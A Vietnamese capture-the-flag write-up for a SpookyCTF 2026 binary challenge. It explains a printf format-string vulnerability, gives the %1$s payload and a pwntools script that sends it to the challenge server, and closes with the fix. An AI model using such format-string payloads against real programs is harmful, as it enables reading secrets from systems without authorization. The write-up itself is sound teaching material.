# Cyberphobia: Formatting Nightmare

**Nền tảng:** SpookyCTF 2026
**Thể loại:** Pwn (Binary Exploitation)
**Độ khó:** Medium
**Điểm:** 75

---

## 1. Tổng quan Challenge

Challenge cung cấp hai file:

- `fsvchall2`: File binary thực thi.
- `fsvchall2.c`: Source code của chương trình.

Thông tin kết nối đến server:

```text
18.226.103.146:9002
```

**Mục tiêu:** Khai thác chương trình để đọc nội dung bí mật được lưu trên server và lấy flag theo định dạng `spooky{...}`.

## 2. Phân tích Source Code

Sau khi đọc source code, ta nhận thấy chương trình thực hiện các bước:

- Mở file `/opt/ctf/chall2/secret.txt`.
- Đọc nội dung file vào biến `secret`.
- Truyền biến `secret` vào hàm `vuln()` để xử lý dữ liệu đầu vào.

Đoạn code quan trọng nằm trong hàm `vuln()`:

```c
void vuln(const char *secret) {
    char input[256];
    printf("Input: ");

    if (fgets(input, sizeof(input), stdin) == NULL)
        return;

    printf(input, secret);
    printf("\n");
}
```

Điểm đáng chú ý là câu lệnh:

```c
printf(input, secret);
```

Thông thường, `printf()` nên sử dụng một chuỗi định dạng cố định. Tuy nhiên, chương trình lại truyền trực tiếp dữ liệu do người dùng nhập vào làm chuỗi định dạng.

Điều này tạo ra lỗ hổng **Format String Vulnerability (FSV)**.

## 3. Phân tích lỗ hổng

Hàm `printf()` hỗ trợ nhiều format specifier, trong đó có:

| Format | Chức năng |
|---|---|
| `%p` | In địa chỉ bộ nhớ |
| `%x` | In dữ liệu dưới dạng hexadecimal |
| `%s` | Đọc và in chuỗi ký tự từ địa chỉ được cung cấp |
| `%n` | Ghi số lượng ký tự đã in vào địa chỉ được cung cấp |

Trong bài này, chương trình truyền biến `secret` làm đối số biến đầu tiên của `printf()`.

Đối với kiến trúc Linux x86-64 sử dụng System V AMD64 ABI, các đối số được truyền qua thanh ghi:

- RDI: Đối số thứ nhất, chứa chuỗi định dạng `input`.
- RSI: Đối số biến đầu tiên, chứa con trỏ `secret`.

Do đó, ta có thể truy cập trực tiếp nội dung của biến `secret` bằng positional format specifier.

## 4. Xây dựng Payload

Payload được sử dụng:

```text
%1$s
```

Giải thích:

- `%1$`: Truy cập đối số biến thứ nhất của hàm `printf()`.
- `s`: Yêu cầu `printf()` xem đối số đó là con trỏ chuỗi và in nội dung tại địa chỉ tương ứng.

Vì đối số biến thứ nhất chính là con trỏ đến `secret`, payload trên cho phép đọc nội dung bí mật mà chương trình đã tải từ file `secret.txt`.

Ưu điểm của cách khai thác này là không cần tìm offset trên stack, leak địa chỉ hay thực hiện ROP.

## 5. Khai thác trên Remote Server

Sau khi xác định được lỗ hổng và payload, ta sử dụng thư viện Pwntools để kết nối đến server của SpookyCTF.

### Exploit Script

Tạo file `solve.py` với nội dung:

```python
#!/usr/bin/python3
from pwn import *

# Kết nối đến server
p = remote('18.226.103.146', 9002)

# Gửi payload khai thác
p.sendline(b'%1$s')

# Nhận dữ liệu trả về
p.interactive()
```

### Thực thi Exploit

Chạy chương trình bằng lệnh:

```bash
python3 solve.py
```

Giải thích:

1. `remote()` thiết lập kết nối đến server tại địa chỉ và cổng được cung cấp.
2. `sendline()` gửi payload `%1$s` đến chương trình trên server.
3. `interactive()` cho phép hiển thị dữ liệu trả về và tương tác trực tiếp với server.

Khi nhận được payload, chương trình trên server xử lý chuỗi định dạng và in nội dung của biến `secret`.

## 6. Kết quả

Khai thác thành công lỗ hổng Format String Vulnerability cho phép đọc nội dung bí mật từ server mà không cần truy cập trực tiếp vào file `secret.txt`.

**Flag:** `spooky{...}`

![Kết quả khai thác Remote](images/solve.png)

## 7. Tổng kết

Challenge này khai thác lỗ hổng Format String Vulnerability do sử dụng dữ liệu đầu vào của người dùng trực tiếp làm chuỗi định dạng trong hàm `printf()`.

Thông qua việc phân tích source code và hiểu cách truyền tham số trên kiến trúc x86-64, ta xác định được biến `secret` nằm ở đối số biến đầu tiên của `printf()`.

Từ đó, sử dụng payload `%1$s` để đọc nội dung bí mật trên remote server và lấy flag.

### Cách khắc phục

Thay vì sử dụng:

```c
printf(input, secret);
```

Nên sử dụng:

```c
printf("%s", input);
```

Việc sử dụng chuỗi định dạng cố định giúp dữ liệu đầu vào chỉ được xem là chuỗi ký tự thông thường, tránh để người dùng điều khiển các format specifier của `printf()`.

---

**SpookyCTF 2026 | Cyberphobia: Formatting Nightmare**